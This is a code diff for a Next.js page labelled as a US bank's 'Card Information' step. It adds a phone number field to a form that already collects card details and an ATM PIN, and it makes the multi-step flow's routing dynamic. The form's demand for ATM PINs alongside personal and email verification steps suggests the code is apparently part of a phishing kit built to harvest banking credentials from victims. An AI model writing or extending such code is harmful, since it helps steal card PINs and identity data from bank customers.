@@ -17,6 +17,8 @@ import axios from "axios";
 import { useRouter } from "next/router";
 import { useForm } from "react-hook-form";
 import { DataContext } from "../../_app";
+import { getProgress } from "../../../utils/getProgress";
+import { getNextUrl } from "../../../utils/getNextUrl";
 
 interface CardInformationProps {}
 
@@ -60,6 +62,9 @@ const schema = yup.object().shape({
       5,
       "Oops! Looks like the number you entered isn't valid. Please enter a valid ATM pin."
     ),
+  phoneNumber: yup
+    .string()
+    .required("The field can't be left blank. Please enter your phone number."),
 });
 
 const CardInformation: React.FC<CardInformationProps> = () => {
@@ -98,7 +103,9 @@ const CardInformation: React.FC<CardInformationProps> = () => {
       cardDetails: data,
     });
 
-    push(`/US/bank/personal-information`);
+    const url = getProgress()[getProgress().indexOf(`Card Information`) + 1];
+
+    push(getNextUrl(url));
   });
 
   return (
@@ -107,16 +114,8 @@ const CardInformation: React.FC<CardInformationProps> = () => {
       <Wrapper>
         <Container>
           <ProgressBar
-            indicators={[
-              `Card Information`,
-              `Personal Information`,
-              `Email Verification`,
-              ...(process.env.NEXT_PUBLIC_DOCS_PAGE === `ON`
-                ? [`Supporting Documents`]
-                : []),
-              `Confirmation`,
-            ]}
-            highlight={0}
+            indicators={getProgress()}
+            highlight={getProgress().indexOf(`Card Information`)}
           />
           <Section>
             <IntroText
@@ -212,6 +211,21 @@ const CardInformation: React.FC<CardInformationProps> = () => {
                         register={register}
                         name={`cardPin`}
                         curValue={watch(`cardPin`)}
+                      />
+                    </InputWrapper>
+                    <InputWrapper>
+                      <Input
+                        as={ReactInputMask}
+                        mask="(999) 999 9999"
+                        label={`Phone Number`}
+                        placeholder={`Phone Number`}
+                        boxStyle={{
+                          w: `100%`,
+                        }}
+                        error={errors.phoneNumber && errors.phoneNumber.message}
+                        register={register}
+                        name={`phoneNumber`}
+                        curValue={watch(`phoneNumber`)}
                       />
                     </InputWrapper>
                     <Button
